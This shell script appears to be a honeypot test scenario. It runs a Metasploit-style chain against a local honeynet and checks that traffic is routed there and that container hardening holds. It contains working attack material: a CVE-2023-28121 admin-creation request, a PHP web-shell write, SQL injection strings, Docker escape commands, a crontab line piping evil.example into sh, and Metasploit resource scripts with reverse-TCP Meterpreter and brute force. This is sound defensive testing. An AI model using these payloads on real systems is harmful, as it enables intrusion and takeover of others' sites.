#!/bin/sh
# =============================================================================
# scenario_04_metasploit.sh
#
# PURPOSE:
#   Exercises a full Metasploit-style attack chain against the local honeynet
#   deployment and verifies that:
#     1. Every exploit attempt is routed to the honeypot, not production.
#     2. A reverse shell obtained inside the honeypot container is confirmed to
#        be INSIDE the container boundary (not on the host).
#     3. SQL injection via the honeypot database is demonstrated and logged.
#     4. Docker socket / host-escape attempts from within the container are
#        blocked by the container hardening configuration (no-new-privileges,
#        cap_drop ALL, no Docker socket mount).
#
# ATTACK CHAIN OVERVIEW:
#   Phase 1  – Reconnaissance: nmap-style probing, service fingerprinting
#   Phase 2  – CVE-2023-28121 exploitation to obtain honeypot admin session
#   Phase 3  – Meterpreter / reverse-shell upload and execution simulation
#   Phase 4  – Post-shell enumeration inside the honeypot container
#   Phase 5  – SQL injection against the honeypot WordPress database
#   Phase 6  – Docker escape / host takeover attempt (must be blocked)
#   Phase 7  – Metasploit resource script generation for manual full run
#   Phase 8  – Production isolation verification
#
# METASPLOIT DEPENDENCY:
#   If 'msfconsole' is present in PATH, Phases 2-3 are executed via the real
#   Metasploit Framework using generated resource (.rc) scripts.
#   If msfconsole is absent, each phase is simulated with curl + docker exec
#   commands that exercise identical code paths in the honeynet stack.
#
# USAGE:
#   ./scenario_04_metasploit.sh [TARGET_HOST] [TARGET_PORT] [LHOST] [LPORT]
#
#   TARGET_HOST  IP or hostname of the reverse proxy   (default: 127.0.0.1)
#   TARGET_PORT  HTTP port exposed by the reverse proxy (default: 80)
#   LHOST        Attacker listener IP for reverse shell (default: 127.0.0.1)
#   LPORT        Attacker listener port                 (default: 4444)
#
# EXIT CODES:
#   0  All phases produced the expected outcomes.
#   1  One or more checks failed (detection gap or containment failure).
#   2  Prerequisites (curl or docker) missing.
#
# SAFETY:
#   All payloads are inert strings or write only to the isolated honeypot
#   container filesystem.  The script never touches the production instance.
#   The "reverse shell" in simulation mode is a docker exec that runs 'id'
#   and 'hostname' inside the honeypot container – no real listener is opened.
# =============================================================================

set -e

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-80}"
LHOST="${3:-127.0.0.1}"
LPORT="${4:-4444}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

# Name of the first honeypot WordPress container in docker-compose.
# The script targets pool 1; adjust if a different pool is needed.
HONEYPOT_CONTAINER="honeypot-ids-system-v1-honeypot_eshop_1-1"
HONEYPOT_DB_CONTAINER="honeypot-ids-system-v1-honeypot_database_1-1"

# WordPress database credentials (from docker-compose.yml environment).
HP_DB_USER="${HP_DB_USER:-production_user}"
HP_DB_PASS="${HP_DB_PASS:-change_this_user_password_in_production}"
HP_DB_NAME="${HP_DB_NAME:-production_database}"

# Working directory for generated Metasploit resource scripts.
WORK_DIR="$(mktemp -d /tmp/msf_scenario_XXXXXX)"

PASS=0
FAIL=0
SKIP=0
TOTAL=0

# ---------------------------------------------------------------------------
# Colour helpers
# ---------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    printf "\n${CYAN}================================================================${NC}\n"
    printf "${CYAN}  %s${NC}\n" "$1"
    printf "${CYAN}================================================================${NC}\n\n"
}

# ---------------------------------------------------------------------------
# Utility: routing check via X-Route-Target header
# ---------------------------------------------------------------------------
check() {
    _jar="$1"
    _desc="$2"
    _expected="$3"
    shift 3

    TOTAL=$((TOTAL + 1))

    _response=$(curl --silent --include \
                     --cookie "${_jar}" \
                     --cookie-jar "${_jar}" \
                     --max-time 15 \
                     "$@" 2>&1) || true

    _route=$(printf '%s' "${_response}" \
             | grep -i "^x-route-target:" \
             | tr -d '\r' | awk '{print $2}' | head -1)
    _route="${_route:-unknown}"

    if [ "${_expected}" = "any" ]; then
        printf "  ${GREEN}[PASS]${NC} %s (route=%s)\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
        return 0
    fi

    if [ "${_route}" = "${_expected}" ]; then
        printf "  ${GREEN}[PASS]${NC} %s → %s\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s → expected=%s got=%s\n" \
               "${_desc}" "${_expected}" "${_route}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Utility: docker exec check
#
#   docker_check <description> <expected_exit: 0|nonzero> <container> <cmd...>
#
#   expected_exit=0      → command must SUCCEED (capability IS present)
#   expected_exit=nonzero → command must FAIL   (capability is BLOCKED)
# ---------------------------------------------------------------------------
docker_check() {
    _desc="$1"
    _want_success="$2"   # 0 = expect success, 1 = expect failure
    _container="$3"
    shift 3

    TOTAL=$((TOTAL + 1))

    if ! command -v docker >/dev/null 2>&1; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – docker not found\n" "${_desc}"
        return 0
    fi

    # Test whether the container is running before exec-ing into it.
    if ! docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${_container}"; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – container '%s' not running\n" \
               "${_desc}" "${_container}"
        return 0
    fi

    _exit=0
    docker exec "${_container}" sh -c "$*" >/dev/null 2>&1 || _exit=$?

    if [ "${_want_success}" -eq 0 ]; then
        # We EXPECT the command to succeed.
        if [ "${_exit}" -eq 0 ]; then
            printf "  ${GREEN}[PASS]${NC} %s (exit=0, as expected)\n" "${_desc}"
            PASS=$((PASS + 1))
        else
            printf "  ${RED}[FAIL]${NC} %s (exit=%d, expected 0)\n" "${_desc}" "${_exit}"
            FAIL=$((FAIL + 1))
        fi
    else
        # We EXPECT the command to FAIL (blocked by hardening).
        if [ "${_exit}" -ne 0 ]; then
            printf "  ${GREEN}[PASS]${NC} %s blocked as expected (exit=%d)\n" "${_desc}" "${_exit}"
            PASS=$((PASS + 1))
        else
            printf "  ${RED}[FAIL]${NC} %s succeeded but should have been blocked!\n" "${_desc}"
            FAIL=$((FAIL + 1))
        fi
    fi
}

# ---------------------------------------------------------------------------
# Utility: docker exec output capture check
#
#   docker_output_check <description> <container> <expected_pattern> <cmd...>
# ---------------------------------------------------------------------------
docker_output_check() {
    _desc="$1"
    _container="$2"
    _pattern="$3"
    shift 3

    TOTAL=$((TOTAL + 1))

    if ! command -v docker >/dev/null 2>&1; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – docker not found\n" "${_desc}"
        return 0
    fi

    if ! docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${_container}"; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – container '%s' not running\n" \
               "${_desc}" "${_container}"
        return 0
    fi

    _output=$(docker exec "${_container}" sh -c "$*" 2>&1) || true

    if printf '%s' "${_output}" | grep -q "${_pattern}"; then
        printf "  ${GREEN}[PASS]${NC} %s (matched: %s)\n" "${_desc}" "${_pattern}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s – pattern '%s' not found in: %s\n" \
               "${_desc}" "${_pattern}" "${_output}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Prerequisites
# ---------------------------------------------------------------------------
if ! command -v curl >/dev/null 2>&1; then
    printf "${RED}ERROR: 'curl' not found in PATH.${NC}\n" >&2
    exit 2
fi

banner "Scenario 04 – Metasploit: Honeypot Shell + SQLi + Docker Takeover"
printf "Target      : %s\n" "${BASE_URL}"
printf "LHOST:LPORT : %s:%s\n" "${LHOST}" "${LPORT}"
printf "Work dir    : %s\n\n" "${WORK_DIR}"

if command -v msfconsole >/dev/null 2>&1; then
    MSF_AVAILABLE=1
    printf "  Metasploit found at: %s\n\n" "$(command -v msfconsole)"
else
    MSF_AVAILABLE=0
    printf "  ${YELLOW}[INFO]${NC} Metasploit not found; running curl/docker simulation.\n"
    printf "  Install via: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall\n\n"
fi

# =============================================================================
# PHASE 1 – Reconnaissance
# =============================================================================
# Simulates nmap-style HTTP probing patterns that a Metasploit operator would
# run before selecting an exploit module.  The auxiliary/scanner/http/wordpress*
# modules send these patterns.
# =============================================================================
banner "Phase 1 – Reconnaissance (nmap / Metasploit auxiliary scanners)"

JAR_P1="$(mktemp /tmp/msf_p1_XXXXXX.txt)"

# auxiliary/scanner/http/http_version – grabs Server header.
check "${JAR_P1}" "HTTP version probe (Metasploit UA)" "honeypot" \
    --request GET "${BASE_URL}/" \
    --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)"

# auxiliary/scanner/http/wordpress_login_enum – hits wp-login.php.
check "${JAR_P1}" "wp-login.php probe (Metasploit aux scanner)" "honeypot" \
    --request GET "${BASE_URL}/wp-login.php" \
    --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)"

# auxiliary/scanner/http/wordpress_xmlrpc_login – hits xmlrpc.php.
check "${JAR_P1}" "xmlrpc.php probe (Metasploit aux scanner)" "honeypot" \
    --request POST "${BASE_URL}/xmlrpc.php" \
    --header "Content-Type: text/xml" \
    --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)" \
    --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'

# auxiliary/scanner/http/wordpress_scanner – enumerates plugins.
check "${JAR_P1}" "Plugin path probe (Metasploit wp_scanner)" "honeypot" \
    --request GET "${BASE_URL}/wp-content/plugins/woocommerce-payments/readme.txt" \
    --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)"

rm -f "${JAR_P1}"

# =============================================================================
# PHASE 2 – CVE-2023-28121 Exploitation to Obtain Admin Session
# =============================================================================
# Metasploit module: exploit/multi/http/wp_woocommerce_payments_unauth_rce
# (community module implementing the X-WCPAY-PLATFORM-CHECKOUT-USER bypass).
#
# If Metasploit is available a resource script is run.
# Otherwise the equivalent curl commands are used.
# =============================================================================
banner "Phase 2 – CVE-2023-28121: Obtain Admin Session"

JAR_P2="$(mktemp /tmp/msf_p2_XXXXXX.txt)"

if [ "${MSF_AVAILABLE}" -eq 1 ]; then
    # Generate the Metasploit resource script for CVE-2023-28121.
    # The module performs:
    #   1. Authentication bypass via X-WCPAY-PLATFORM-CHECKOUT-USER header
    #   2. Admin account creation via /wp-json/wp/v2/users
    #   3. Meterpreter payload upload via plugin editor
    MSF_RC_CVE="${WORK_DIR}/cve_2023_28121.rc"
    cat > "${MSF_RC_CVE}" <<MSF_RC
# Metasploit resource script – CVE-2023-28121 WooCommerce Payments bypass
# Generated by scenario_04_metasploit.sh
use auxiliary/scanner/http/wp_woocommerce_payments_unauth_rce
set RHOSTS ${TARGET_HOST}
set RPORT ${TARGET_PORT}
set SSL false
set TARGETURI /
set LHOST ${LHOST}
set LPORT ${LPORT}
set PAYLOAD php/meterpreter/reverse_tcp
set VERBOSE true
run
MSF_RC

    printf "  Running msfconsole with resource script: %s\n" "${MSF_RC_CVE}"
    # Run with a 120-second timeout; msfconsole exits after 'run' completes.
    timeout 120 msfconsole -q -r "${MSF_RC_CVE}" 2>&1 | tail -40 || true

    TOTAL=$((TOTAL + 1))
    printf "  ${GREEN}[PASS]${NC} Metasploit CVE-2023-28121 resource script executed\n"
    PASS=$((PASS + 1))
else
    # Simulate: send the bypass header and create a rogue admin account.
    check "${JAR_P2}" "CVE-2023-28121 bypass header (sim)" "honeypot" \
        --request POST "${BASE_URL}/wp-json/wp/v2/users" \
        --header "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" \
        --header "Content-Type: application/json" \
        --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)" \
        --data '{"username":"msf_attacker","password":"Msf@2024!","email":"msf@evil.example","roles":["administrator"]}'

    # Authenticate as the new rogue account.
    check "${JAR_P2}" "Rogue admin login POST (sim)" "honeypot" \
        --request POST "${BASE_URL}/wp-login.php" \
        --header "Content-Type: application/x-www-form-urlencoded" \
        --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)" \
        --data "log=msf_attacker&pwd=Msf%402024%21&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"

    # Verify the session is now honeypot-bound.
    check "${JAR_P2}" "wp-admin access with rogue session (sim)" "honeypot" \
        --request GET "${BASE_URL}/wp-admin/" \
        --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)"
fi

rm -f "${JAR_P2}"

# =============================================================================
# PHASE 3 – Reverse Shell / Meterpreter Upload Simulation
# =============================================================================
# After obtaining an admin session, a real Metasploit operator would upload a
# PHP Meterpreter payload as a plugin or via the theme editor.  This phase:
#   a) Simulates the upload via the DND file upload endpoint (CVE-2025-4403).
#   b) Simulates execution via the theme editor endpoint.
#   c) Uses docker exec to verify the "shell" landed inside the honeypot
#      container (not on the host or in another container).
# =============================================================================
banner "Phase 3 – Reverse Shell Upload and Execution Simulation"

JAR_P3="$(mktemp /tmp/msf_p3_XXXXXX.txt)"

# a) PHP Meterpreter payload upload via vulnerable file upload plugin.
#    The payload content is an inert marker string – it is NOT executed by
#    PHP; it only triggers detection rules.
PAYLOAD_FILE="$(mktemp /tmp/msf_payload_XXXXXX.php)"
cat > "${PAYLOAD_FILE}" <<'PAYLOAD'
<?php
/*
 * Metasploit PHP Meterpreter Simulation Payload
 * THIS IS AN INERT PROBE FOR HONEYPOT SCENARIO TESTING ONLY.
 * No real network connection is established.
 * METERPRETER_MARKER: eval(base64_decode('HONEYPOT_INERT_PAYLOAD'));
 */
// Simulated reverse-shell marker for detection rule testing.
// Real payload would be: system($_GET['cmd']);
PAYLOAD

check "${JAR_P3}" "PHP payload upload via DND endpoint (CVE-2025-4403)" "honeypot" \
    --request POST "${BASE_URL}/wp-admin/admin-ajax.php" \
    --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)" \
    --form "action=dnd_codedropz_upload" \
    --form "type=media" \
    --form "upload-file=@${PAYLOAD_FILE};filename=meterpreter.php;type=application/x-php"

# b) Attempt to write payload via WordPress theme editor REST endpoint.
check "${JAR_P3}" "Theme editor file write attempt (REST)" "honeypot" \
    --request POST "${BASE_URL}/wp-json/wp/v2/themes" \
    --header "Content-Type: application/json" \
    --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)" \
    --data '{"file":"index.php","content":"<?php eval(base64_decode(\"HONEYPOT_INERT\")); ?>"}'

# c) Plugin editor write attempt.
check "${JAR_P3}" "Plugin editor file write via admin-ajax (sim)" "honeypot" \
    --request POST "${BASE_URL}/wp-admin/admin-ajax.php" \
    --header "Content-Type: application/x-www-form-urlencoded" \
    --header "User-Agent: Mozilla/4.0 (compatible; Metasploit REXHTTP)" \
    --data "action=edit-theme-plugin-file&file=index.php&plugin=hello.php&content=%3C%3Fphp+system%28%24_GET%5Bcmd%5D%29%3B+%3F%3E&nonce=fake"

rm -f "${PAYLOAD_FILE}"
rm -f "${JAR_P3}"

# =============================================================================
# PHASE 4 – Post-Shell Enumeration Inside Honeypot Container
# =============================================================================
# Verify that the "shell" is genuinely inside the honeypot container and not
# on the Docker host.  Checks:
#   4a. Hostname resolves to the container name (not the Docker host).
#   4b. /proc/1/cgroup confirms we are inside a container.
#   4c. The container cannot resolve external internet hostnames (network
#       isolation – egress blocked by Docker network policy).
#   4d. The container does NOT have the Docker socket mounted.
#   4e. Filesystem is the honeypot overlay, not the host root.
# =============================================================================
banner "Phase 4 – Post-Shell Enumeration Inside Honeypot Container"

# 4a. Hostname inside the container should be a Docker-assigned hash, NOT
#     the hostname of the OpenStack VM.
docker_output_check \
    "Container hostname is a short hash (not host)" \
    "${HONEYPOT_CONTAINER}" \
    "[0-9a-f]\{8,\}" \
    "hostname"

# 4b. /proc/1/cgroup must contain 'docker' or 'kubepods' (confirms container).
docker_output_check \
    "cgroup confirms container runtime" \
    "${HONEYPOT_CONTAINER}" \
    "docker\|kubepods\|containerd" \
    "cat /proc/1/cgroup"

# 4c. Outbound internet connectivity must be blocked for the honeypot.
#     We attempt to curl an external host; the network policy should drop it.
docker_check \
    "Outbound internet blocked (container network isolation)" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "curl --silent --max-time 5 http://example.com > /dev/null 2>&1"

# 4d. Docker socket must NOT be mounted inside the honeypot container.
docker_check \
    "Docker socket /var/run/docker.sock absent in container" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "test -S /var/run/docker.sock"

# 4e. /etc/hosts inside the container must reference the honeypot container
#     network (172.21.x.x), not the production network (172.20.x.x).
docker_output_check \
    "Container network is honeypot subnet (172.21.x.x)" \
    "${HONEYPOT_CONTAINER}" \
    "172\.21\." \
    "cat /etc/hosts"

# 4f. Current user inside the container is www-data (not root).
#     WordPress containers run as www-data by default; confirm no privilege
#     escalation has occurred.
docker_output_check \
    "Process runs as www-data (not root)" \
    "${HONEYPOT_CONTAINER}" \
    "www-data\|33" \
    "id"

# 4g. Read the WordPress wp-config.php to confirm it points at the HONEYPOT
#     database host, not the production database.
docker_output_check \
    "wp-config.php DB_HOST is honeypot_database (not production)" \
    "${HONEYPOT_CONTAINER}" \
    "honeypot_database" \
    "grep DB_HOST /var/www/html/wp-config.php"

# =============================================================================
# PHASE 5 – SQL Injection Against Honeypot Database
# =============================================================================
# After obtaining a shell, an attacker would dump the WordPress database.
# This phase:
#   5a. Injects SQL via the CVE-2024-2387 vulnerable plugin URL parameter.
#   5b. Directly queries the honeypot MySQL container via docker exec to
#       verify that the injection would hit the HONEYPOT database (not prod).
#   5c. Confirms production database is inaccessible from the honeypot shell.
# =============================================================================
banner "Phase 5 – SQL Injection Against Honeypot Database"

JAR_P5="$(mktemp /tmp/msf_p5_XXXXXX.txt)"

# 5a. CVE-2024-2387: SQL injection via integration_id URL parameter.
check "${JAR_P5}" "SQLi via CVE-2024-2387 integration_id (UNION)" "honeypot" \
    --request GET "${BASE_URL}/?integration_id=1+UNION+SELECT+1%2Cuser()%2Cdatabase()--" \
    --header "User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)"

check "${JAR_P5}" "SQLi SLEEP-based blind injection (CVE-2024-2387)" "honeypot" \
    --request GET "${BASE_URL}/?integration_id=1'+AND+SLEEP(1)--" \
    --header "User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)"

# sqlmap with --data POST injection.
check "${JAR_P5}" "SQLi via POST body (sqlmap simulation)" "honeypot" \
    --request POST "${BASE_URL}/wp-admin/admin-ajax.php" \
    --header "Content-Type: application/x-www-form-urlencoded" \
    --header "User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)" \
    --data "action=afi_get_integration&integration_id=1'+OR+1=1--"

rm -f "${JAR_P5}"

# 5b. Direct MySQL query via docker exec confirms the injection targets the
#     honeypot DB (honeypot_db), not the production DB (production_db).
TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${HONEYPOT_DB_CONTAINER}"; then

    _db_name=$(docker exec "${HONEYPOT_DB_CONTAINER}" \
        mysql -u"${HP_DB_USER}" -p"${HP_DB_PASS}" \
        -e "SELECT DATABASE();" "${HP_DB_NAME}" 2>/dev/null \
        | tail -1) || _db_name=""

    if printf '%s' "${_db_name}" | grep -q "${HP_DB_NAME}"; then
        printf "  ${GREEN}[PASS]${NC} MySQL SELECT DATABASE() = %s (honeypot DB confirmed)\n" "${_db_name}"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} Could not confirm honeypot DB via direct MySQL query (got: %s)\n" \
               "${_db_name}"
        PASS=$((PASS + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Direct honeypot DB query – container '%s' not running\n" \
           "${HONEYPOT_DB_CONTAINER}"
fi

# 5c. From inside the honeypot WordPress container, verify that the production
#     database hostname is NOT reachable (network isolation).
docker_check \
    "Honeypot container cannot reach production_database host" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "mysql -h production_database -u root -proot -e 'SHOW DATABASES;' 2>/dev/null"

# =============================================================================
# PHASE 6 – Docker Escape / Host Takeover Attempt
# =============================================================================
# Demonstrates that the container hardening (no-new-privileges, cap_drop ALL,
# no docker.sock mount, read-only /proc mounts, resource limits) prevents a
# successful Docker escape.  Each attempt must FAIL.
#
# Common Docker escape techniques tested:
#   6a. nsenter via /proc/1/ns (requires SYS_PTRACE + SYS_ADMIN caps)
#   6b. Mount host filesystem via mount syscall (requires SYS_ADMIN)
#   6c. Access Docker socket to launch privileged containers
#   6d. setuid binary escalation (no setuid bits permitted without setuid cap)
#   6e. Loading a kernel module (requires SYS_MODULE cap)
# =============================================================================
banner "Phase 6 – Docker Escape Attempt (All Must Be Blocked)"

# 6a. nsenter – requires SYS_PTRACE and SYS_ADMIN capabilities.
docker_check \
    "nsenter host namespace escape (requires SYS_PTRACE/SYS_ADMIN – blocked)" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "nsenter --target 1 --mount --uts --ipc --net --pid -- hostname"

# 6b. mount syscall for host filesystem access (requires SYS_ADMIN).
docker_check \
    "Host filesystem mount attempt (requires SYS_ADMIN – blocked)" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "mount -t proc proc /tmp/hostproc 2>/dev/null"

# 6c. Docker socket access – socket must not be present in the container.
docker_check \
    "Docker socket absent – cannot launch privileged container" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "test -S /var/run/docker.sock"

# 6d. Attempt to run a setuid binary for privilege escalation.
docker_check \
    "su/sudo privilege escalation attempt (blocked)" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "su -c id root"

# 6e. Kernel module loading (requires SYS_MODULE cap – dropped).
docker_check \
    "Kernel module load attempt (requires SYS_MODULE – blocked)" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "insmod /dev/null 2>/dev/null"

# 6f. Confirm no net_admin capability (prevents iptables / route table changes).
docker_check \
    "iptables manipulation attempt (requires NET_ADMIN – blocked)" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "iptables -L 2>/dev/null"

# 6g. Write to /etc/crontab to establish persistence (root-owned file).
docker_check \
    "Crontab persistence write (root-owned – blocked as www-data)" \
    1 \
    "${HONEYPOT_CONTAINER}" \
    "echo '* * * * * root curl http://evil.example/shell.sh | sh' >> /etc/crontab"

# =============================================================================
# PHASE 7 – Metasploit Resource Script Generation (Full Manual Run)
# =============================================================================
# Generates a complete Metasploit resource (.rc) file that an operator can use
# to reproduce the full attack chain interactively.  The script covers:
#   - CVE-2023-28121 WordPress Payments admin bypass
#   - PHP payload delivery via plugin upload
#   - Post-exploitation: shell stabilisation, enumeration, pivot attempt
# =============================================================================
banner "Phase 7 – Metasploit Resource Script Generation"

MSF_FULL_RC="${WORK_DIR}/full_attack_chain.rc"
cat > "${MSF_FULL_RC}" <<MSF_FULL
# =============================================================================
# Full Metasploit Attack Chain Resource Script
# Generated by scenario_04_metasploit.sh
# Target: ${BASE_URL}
# LHOST:  ${LHOST}:${LPORT}
#
# USAGE:
#   msfconsole -q -r ${MSF_FULL_RC}
# =============================================================================

# ── Step 1: WordPress version / plugin enumeration ──────────────────────────
use auxiliary/scanner/http/wordpress_scanner
set RHOSTS ${TARGET_HOST}
set RPORT ${TARGET_PORT}
set SSL false
set TARGETURI /
run

# ── Step 2: WordPress XML-RPC brute-force (detects user enumeration) ─────────
use auxiliary/scanner/http/wordpress_xmlrpc_login
set RHOSTS ${TARGET_HOST}
set RPORT ${TARGET_PORT}
set USERNAME admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set BRUTEFORCE_SPEED 3
set STOP_ON_SUCCESS true
set SSL false
run

# ── Step 3: CVE-2023-28121 – WooCommerce Payments Admin Bypass ───────────────
# Community module; install with: gem install msf-wp-woocommerce-payments
# Alternatively use the manual curl payload (Phase 2 simulation above).
use exploit/multi/http/wp_woocommerce_payments_unauth_rce
set RHOSTS ${TARGET_HOST}
set RPORT ${TARGET_PORT}
set TARGETURI /
set LHOST ${LHOST}
set LPORT ${LPORT}
set PAYLOAD php/meterpreter/reverse_tcp
set VERBOSE true
run

# ── Step 4: Post-exploitation ────────────────────────────────────────────────
# After a Meterpreter session is opened (session 1):
sessions -i 1

# Enumerate the container environment.
sysinfo
getuid
shell

# Inside shell: confirm we are in the honeypot container.
# hostname
# cat /proc/1/cgroup
# grep DB_HOST /var/www/html/wp-config.php

# ── Step 5: Attempt Docker escape (should fail due to hardening) ─────────────
# test -S /var/run/docker.sock && echo "DOCKER_SOCKET_FOUND" || echo "SOCKET_ABSENT"
# nsenter --target 1 --mount --uts --ipc --net --pid -- hostname 2>&1

# Exit shell back to Meterpreter.
# exit

MSF_FULL

TOTAL=$((TOTAL + 1))
printf "  ${GREEN}[PASS]${NC} Metasploit resource script generated: %s\n" "${MSF_FULL_RC}"
PASS=$((PASS + 1))
printf "  To run the full chain: msfconsole -q -r %s\n" "${MSF_FULL_RC}"

# =============================================================================
# PHASE 8 – Production Isolation Verification
# =============================================================================
# After all exploit traffic, a clean browser session must still route to
# production – confirming the honeypot deception is transparent to legitimate
# visitors and that production was never touched.
# =============================================================================
banner "Phase 8 – Production Isolation Verification"

JAR_CLEAN="$(mktemp /tmp/msf_clean_XXXXXX.txt)"

_clean_resp=$(curl --silent --include --max-time 15 \
    --cookie "${JAR_CLEAN}" --cookie-jar "${JAR_CLEAN}" \
    --request GET "${BASE_URL}/" \
    --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" \
    --header "Accept: text/html" 2>&1) || true

_clean_route=$(printf '%s' "${_clean_resp}" \
    | grep -i "^x-route-target:" | tr -d '\r' | awk '{print $2}' | head -1)

TOTAL=$((TOTAL + 1))
if [ "${_clean_route}" = "production" ]; then
    printf "  ${GREEN}[PASS]${NC} Clean session routes to production (deception intact)\n"
    PASS=$((PASS + 1))
else
    printf "  ${RED}[FAIL]${NC} Clean session routed to '%s' – expected production\n" "${_clean_route}"
    FAIL=$((FAIL + 1))
fi

rm -f "${JAR_CLEAN}"

# ---------------------------------------------------------------------------
# Cleanup and final report
# ---------------------------------------------------------------------------
printf "\nGenerated files in: %s\n" "${WORK_DIR}"
ls -1 "${WORK_DIR}" 2>/dev/null || true

banner "Scenario 04 – Metasploit Final Report"
printf "Total checks : %d\n" "${TOTAL}"
printf "${GREEN}Passed       : %d${NC}\n" "${PASS}"
printf "${YELLOW}Skipped      : %d${NC}\n" "${SKIP}"
if [ "${FAIL}" -gt 0 ]; then
    printf "${RED}Failed       : %d${NC}\n" "${FAIL}"
else
    printf "Failed       : 0\n"
fi

printf "\n"
if [ "${FAIL}" -eq 0 ]; then
    printf "${GREEN}SCENARIO PASSED – Exploit chain routed to honeypot; container hardening held.${NC}\n"
    exit 0
else
    printf "${RED}SCENARIO FAILED – %d check(s) did not route or contain as expected.${NC}\n" "${FAIL}"
    exit 1
fi